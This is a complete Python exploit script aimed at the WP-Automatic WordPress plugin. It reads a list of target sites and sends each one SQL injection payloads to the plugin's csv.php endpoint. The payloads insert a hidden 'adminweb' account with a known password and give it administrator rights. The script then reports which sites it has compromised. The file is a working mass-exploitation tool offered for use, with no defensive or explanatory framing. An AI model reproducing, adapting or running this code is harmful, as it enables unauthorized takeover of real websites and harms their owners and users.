import requests
import sys
from colorama import Fore, Style, init

# Initialize colorama
init()

def makeRequest(payload, hash, url):
    host = url.split('/', 3)[2]

    headers = {
        'Host': host,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-type': 'application/x-www-form-urlencoded',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1'
    }

    data = {
        'q': payload,
        'auth': b'\0',
        'integ': hash
    }

    response = requests.post(url, data=data, headers=headers)
    return response


def helpUsage():
    print("[+] You must run the exploit passing the file containing URLs. \n[+] Example: python3 exploit.py list.txt")
    quit()


def verifyArgs(argv):
    if len(argv) != 2:
        helpUsage()


def main(argv):
    verifyArgs(argv)
    file_path = argv[1]

    try:
        with open(file_path, 'r') as file:
            urls = file.readlines()
    except FileNotFoundError:
        print(f"[+] File not found: {file_path}")
        quit()

    for domain in urls:
        domain = domain.strip()
        if not domain:
            continue
        url = domain + '/wp-content/plugins/wp-automatic/inc/csv.php'

        print(f"[+] Testing {domain}")

        try:
            # first request (create user)
            print("[+] Creating user adminweb")
            response = makeRequest(
                "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES ('adminweb', '$P$BASbMqW0nlZRux/2IhCw7AdvoNI4VT0', 'adminweb', 'admin@gmail.com', 'http://127.0.0.1:8000', '2024-04-30 16:26:43', 0, 'adminweb')",
                "09956ea086b172d6cf8ac31de406c4c0", url
            )
            
            if "Tampered query" in response.text or "invalid login" in response.text or "login required" in response.text:
                print("[+] Error in the payload for", domain)
                continue

            if "DATE" not in response.text:
                print(Fore.RED + "[+] Not vulnerable:" + Style.RESET_ALL, domain)
                continue

            # second request (give permission)
            print("[+] Giving adminweb administrator permissions")
            response = makeRequest(
                "INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ((SELECT ID FROM wp_users WHERE user_login = 'adminweb'), 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')",
                "bd98494b41544b818fa9f583dadfa2bb", url
            )
            
            if "Tampered query" in response.text or "invalid login" in response.text or "login required" in response.text:
                print("[+] Error in the payload for", domain)
                continue

            print("[+] Exploit completed for", domain)
            print("[+] Administrator created: adminweb:admin")

        except requests.exceptions.RequestException as e:
            print("[+] Error with domain:", domain, "-", e)
            continue


if __name__ == "__main__":
    main(sys.argv)
